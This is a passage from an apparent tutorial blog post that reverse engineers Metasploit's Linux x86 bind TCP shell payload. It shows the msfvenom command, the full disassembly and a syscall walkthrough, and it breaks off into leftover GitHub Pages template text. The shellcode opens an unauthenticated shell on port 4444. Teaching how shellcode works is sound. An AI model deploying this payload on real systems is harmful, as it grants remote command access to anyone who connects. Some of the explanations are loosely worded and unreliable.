# Assignment #1: Bind TCP Shell
Create a shell_bind_tcp shellcode that binds to a port and execute a shell on an incoming connection, the port number should be easy to configure.

## Context

Have you ever generated shellcode with tools like Metasploit and MSFvenom? 
If you have, I'm sure you've wondered what that shellcode actually translates to beyond the generic descriptor "linux/x86/shell_bind_tcp".

I'm going to teach you how to not only read shellcode, but create your own as well.

## Prerequisites

- Basic understanding of registers
- Basic understanding of stack and memory
- An interest in the subject

## Approach

There are dozens of approaches you could take to create shellcode, but before we create it, we first need to need to understand how it works. 
To better understand what's happening, we're going to reverse enginner and analyze it.

```markdown
root@ubuntu:/mnt/hgfs/assembly/exam/1-Assignment/working/4-testShellcode# msfvenom --arch x86 --platform linux --payload linux/x86/shell_bind_tcp R | ndisasm -u -
No encoder specified, outputting raw payload
Payload size: 78 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```

## Was that supposed to mean anything?

Now if you're not experienced with assembly I'm sure your very confused right now. That's alright though, we're going to learn what all this means.
Let's start from the top, where the first "int 0x80" instruction is passed. This is known as a syscall instruction, it let's the processor know to interpret the current registers as such.

## Syscalls

Moving up 1 position, we see the instruction "mov al,0x66". 0x66 converted to Hex is 102. Every syscall has an integer assigned to it so it can be identified and processed as it's specific function. If we inspect "/usr/include/i386-linux-gnu/asm/unistd_32.h" we can see syscall (102) points to "socketcall".

```
#define __NR_socketcall         102
#define __NR_syslog             103
#define __NR_setitimer          104
#define __NR_getitimer          105
#define __NR_stat               106
#define __NR_lstat              107
#define __NR_fstat              108
#define __NR_olduname           109
#define __NR_iopl               110
#define __NR_vhangup            111
#define __NR_idle               112
#define __NR_vm86old            113
```

## What is socketcall? 

Well put simply, it's a common kernel entry point for socket system calls. If we read the documentation [here](https://man7.org/linux/man-pages/man2/socketcall.2.html) we can see it takes 2 parameters: socketcall(int call, unsigned long *args). 
This is important to know because when we call this syscall we'll need to invoke it correctly. 

If we read the documentation we can see it takes the socket function as the first parameter, this means that it's deciding how to invoke it. The first argument that would be passed

Let's keep a note of everything we now known about this syscall and move on.

## Syscalls in the shellcode

If you go through the shellcode you'll see 6 syscalls happening. If you were to analyze how each function works along with their parameters, well it would take a long time. So I've saved you the trouble and compiled a list of each syscall being invoked in order of when they appear.

1. socketcall(SYS_SOCKET, (AF_INET, SOCK_STREAM, 0))
2. socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))
3. socketcall(SYS_LISTEN, sockfd)
4. socketcall(SYS_ACCEPT, (sockfd)
5. dup2(acceptFD, (0x2,0x1,0x0))
6. execve(/bin//sh0x00)

Now I encourage you to actually go through the documentation of each so you have a fundamental understanding of what's actually happening.
You can find the documentation for each below:

1. https://man7.org/linux/man-pages/man2/socketcall.2.html
2. https://man7.org/linux/man-pages/man2/bind.2.html
3. https://man7.org/linux/man-pages/man2/listen.2.html
4. https://man7.org/linux/man-pages/man2/accept.2.html
5. https://man7.org/linux/man-pages/man2/execve.2.html

If you're just looking for a quick and dirty explanation I've got you covered too.

1. socketcall(SYS_SOCKET) creates a kernel entry point for socket system calls
2. socketcall(SYS_BIND) assigns an address to a socket referred to by the sockfd file descriptor
3. socketcall(SYS_LISTEN) marks the socket as passive, meaning it will be used to accept incoming connection requests using accept().
4. socketcall(SYS_ACCEPT) extracts the connection request for the listening socket and creates a new connected socket. The newly created socket is not in the listening state.
5. dup2(acceptFD,*) creates a copy of the file descriptor and uses the new specified file descriptor
6. execve(/bin//sh0x00) executes the program referred to by pathname. Which in this case is "/bin//sh"



You can use the [editor on GitHub](https://github.com/CryptoBreach/cryptobreach.github.io/edit/main/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/CryptoBreach/cryptobreach.github.io/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.

